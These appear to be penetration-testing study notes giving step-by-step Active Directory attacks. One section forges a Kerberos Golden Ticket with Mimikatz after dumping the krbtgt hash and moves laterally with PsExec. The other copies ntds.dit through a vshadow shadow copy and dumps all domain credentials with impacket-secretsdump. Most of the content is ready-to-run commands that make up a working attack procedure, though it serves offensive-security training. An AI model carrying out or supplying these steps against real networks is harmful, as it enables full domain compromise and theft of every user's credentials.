## Golden Ticket
Golden Tickets give us permission to access the entire domain’s resources

Background:
- KDC encrypts TGTs with the NTLM password hash of a domain user called krbtgt
- If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
- the krbtgt account password is not automatically changed 👍

> Prerequisites:
> - obtaining NTLM hash of krbtgt: access to Domain Admin's group account, or have compromised the domain controller itself
> - forging golden ticket and injecting into memory: none (can even be performed on non-domain computer)

1. Connect and log in to DC via rdp
2. Run Mimikatz
3. Dump NTLM hash of krbtgt:
   `privilege::debug`
   `lsadump::lsa /patch`
4. Connect to a computer (could be domain-joined or not)
5. Obtain domain SID:
   `whoami /user`
6. Run Mimikatz
7. Delete any existing Kerberos tickets:
   `kerberos::purge`
7. Create golden ticket:
   `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270- 658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`
	- `/user:jen`: current user
	- `/domain:corp.com`: domain name
	- `/sid:S-1-5-21-1987370270- 658905905-1781884369`: domain SID
	- `/krbtgt:1693c6cefafffc7af11ef34d1c788f47`: NTLM hash of krbtgt
	- In the created ticket, the user ID is set to 500 by default (RID of built-in administrator for domain), and the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group
8. Launch new command prompt:
   `misc::cmd`
9. Perform the action (e.g. lateral movement):
   `PsExec.exe \\dc1 cmd.exe`

> Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked

## Shadow Copies

Shadow copy:
- also known as Volume Shadow Service (VSS)
- a Microsoft backup technology that allows creation of snapshots of files or entire volumes. 
- To manage volume shadow copies, the Microsoft signed binary vshadow.exe is offered as part of the Windows SDK. 
- As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. 
- Once we’ve obtained a copy of said database, we can extract every user credential offline on our local Kali machine

> Prerequisite: domain admin

1. Connect as a domain admin user to the domain controller
2. launch from an elevated prompt the vshadow utility:
   `vshadow.exe -nw -p C:`
	- `-nw`: disable writers (speeds up backup creation)
	- `-p C:`: store copy on disk C:
3. Take note of the shadow copy device name from the output of above
4. Copy the shadow copy to the root folder:
   `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
	- specify the shadow copy device name and append the full ntds.dit path (`\windows\ntds\ntds.dit`)
5. To correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry:
   `reg.exe save hklm\system c:\system.bak`
6. Transfer the two bak files to our Kali
7. Extract the credentials using impacket:
   `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
	- `LOCAL`: parse the files locally
8. Obtain the NTLM hashes and Kerberos keys of all AD users from the output, which can now be further cracked or used as-is through pass-the-hash attacks